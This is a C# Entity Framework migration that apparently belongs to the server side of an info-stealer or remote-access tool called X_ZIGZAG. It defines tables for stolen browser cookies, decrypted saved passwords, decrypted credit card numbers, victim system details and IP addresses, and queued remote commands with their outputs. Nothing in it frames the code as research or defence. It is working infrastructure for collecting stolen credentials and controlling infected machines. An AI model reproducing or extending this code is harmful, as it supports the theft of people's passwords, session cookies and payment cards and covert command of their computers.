using System;
using Microsoft.EntityFrameworkCore.Migrations;

#nullable disable

namespace X_ZIGZAG_SERVER_WEB_API.Migrations
{
    /// <inheritdoc />
    public partial class init : Migration
    {
        /// <inheritdoc />
        protected override void Up(MigrationBuilder migrationBuilder)
        {
            migrationBuilder.CreateTable(
                name: "Admins",
                columns: table => new
                {
                    Id = table.Column<string>(type: "text", nullable: false),
                    Username = table.Column<string>(type: "character varying(100)", maxLength: 100, nullable: false),
                    Password = table.Column<string>(type: "character varying(100)", maxLength: 100, nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_Admins", x => x.Id);
                });

            migrationBuilder.CreateTable(
                name: "CheckSettings",
                columns: table => new
                {
                    Id = table.Column<string>(type: "text", nullable: false),
                    Screenshot = table.Column<int>(type: "integer", nullable: false),
                    CheckDuration = table.Column<long>(type: "bigint", nullable: false),
                    CheckCmds = table.Column<bool>(type: "boolean", nullable: false),
                    LatestPing = table.Column<DateTimeOffset>(type: "timestamp with time zone", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_CheckSettings", x => x.Id);
                });

            migrationBuilder.CreateTable(
                name: "Cookies",
                columns: table => new
                {
                    ClientId = table.Column<string>(type: "text", nullable: false),
                    CookieId = table.Column<long>(type: "bigint", nullable: false),
                    BrowserName = table.Column<string>(type: "text", nullable: false),
                    Origin = table.Column<string>(type: "text", nullable: false),
                    Name = table.Column<string>(type: "text", nullable: false),
                    ExpireDate = table.Column<long>(type: "bigint", nullable: false),
                    Value = table.Column<string>(type: "text", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_Cookies", x => new { x.ClientId, x.CookieId });
                });

            migrationBuilder.CreateTable(
                name: "CreditCards",
                columns: table => new
                {
                    ClientId = table.Column<string>(type: "text", nullable: false),
                    CreditCardId = table.Column<long>(type: "bigint", nullable: false),
                    BrowserName = table.Column<string>(type: "text", nullable: false),
                    Origin = table.Column<string>(type: "text", nullable: false),
                    CardHolder = table.Column<string>(type: "text", nullable: false),
                    ExpireDate = table.Column<string>(type: "text", nullable: false),
                    DecrypredCreditCard = table.Column<string>(type: "text", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_CreditCards", x => new { x.ClientId, x.CreditCardId });
                });

            migrationBuilder.CreateTable(
                name: "Instructions",
                columns: table => new
                {
                    ClientId = table.Column<string>(type: "text", nullable: false),
                    InstructionId = table.Column<long>(type: "bigint", nullable: false),
                    Code = table.Column<short>(type: "smallint", nullable: false),
                    Notify = table.Column<bool>(type: "boolean", nullable: false),
                    FunctionArgs = table.Column<string>(type: "text", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_Instructions", x => new { x.ClientId, x.InstructionId });
                });

            migrationBuilder.CreateTable(
                name: "Passwords",
                columns: table => new
                {
                    ClientId = table.Column<string>(type: "text", nullable: false),
                    PasswordId = table.Column<long>(type: "bigint", nullable: false),
                    BrowserName = table.Column<string>(type: "text", nullable: false),
                    Url = table.Column<string>(type: "text", nullable: true),
                    Login = table.Column<string>(type: "text", nullable: true),
                    DecrypredPassword = table.Column<string>(type: "text", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_Passwords", x => new { x.ClientId, x.PasswordId });
                });

            migrationBuilder.CreateTable(
                name: "Results",
                columns: table => new
                {
                    ClientId = table.Column<string>(type: "text", nullable: false),
                    InstructionId = table.Column<long>(type: "bigint", nullable: false),
                    Code = table.Column<short>(type: "smallint", nullable: false),
                    ResultDate = table.Column<DateTimeOffset>(type: "timestamp with time zone", nullable: false),
                    FunctionArgs = table.Column<string>(type: "text", nullable: true),
                    Output = table.Column<string>(type: "text", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_Results", x => new { x.ClientId, x.InstructionId });
                });

            migrationBuilder.CreateTable(
                name: "SystemsInfo",
                columns: table => new
                {
                    Id = table.Column<string>(type: "text", nullable: false),
                    CustomName = table.Column<string>(type: "text", nullable: true),
                    Name = table.Column<string>(type: "text", nullable: false),
                    Created = table.Column<DateTimeOffset>(type: "timestamp with time zone", nullable: false),
                    LatestUpdate = table.Column<DateTimeOffset>(type: "timestamp with time zone", nullable: false),
                    IpAddress = table.Column<string>(type: "text", nullable: false),
                    Version = table.Column<string>(type: "text", nullable: false),
                    SystemSpecs = table.Column<string>(type: "text", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_SystemsInfo", x => x.Id);
                });
        }

        /// <inheritdoc />
        protected override void Down(MigrationBuilder migrationBuilder)
        {
            migrationBuilder.DropTable(
                name: "Admins");

            migrationBuilder.DropTable(
                name: "CheckSettings");

            migrationBuilder.DropTable(
                name: "Cookies");

            migrationBuilder.DropTable(
                name: "CreditCards");

            migrationBuilder.DropTable(
                name: "Instructions");

            migrationBuilder.DropTable(
                name: "Passwords");

            migrationBuilder.DropTable(
                name: "Results");

            migrationBuilder.DropTable(
                name: "SystemsInfo");
        }
    }
}
